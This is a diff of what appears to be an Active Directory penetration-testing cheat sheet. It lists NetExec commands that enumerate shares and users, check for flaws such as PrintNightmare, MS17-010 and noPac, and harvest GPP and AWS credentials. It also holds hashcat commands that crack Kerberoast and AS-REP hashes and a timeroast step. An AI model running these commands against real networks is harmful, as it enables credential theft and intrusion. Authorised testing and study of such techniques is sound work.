@@ -30,15 +30,13 @@ nxc smb <ip> -u '<user>' --use-kcache --shares
 
 nxc smb <ip> -u '<user>' --use-kcache -M ntlm_reflection -M sccm-recon6 -M printnightmare -M webdav -M spooler -M ioxidresolver -M gpp_autologin -M gpp_password -M ms17-010 -M remove-mic -M smbghost -M enum_ca -M aws-credentials
 
-nxc smb <ip> -u '<user>' --use-kcache -M nopac
-
 nxc smb <ip> -u '<user>' --use-kcache --users --rid-brute 10000
-
-nxc smb <ip> -u '<user>' --use-kcache -M timeroast
 
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet
 
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet
+
+nxc smb <ip> -u '<user>' --use-kcache -M timeroast
 
 powerview <domain>/'<user>'@<dc_fqdn> -k --no-pass
 ```
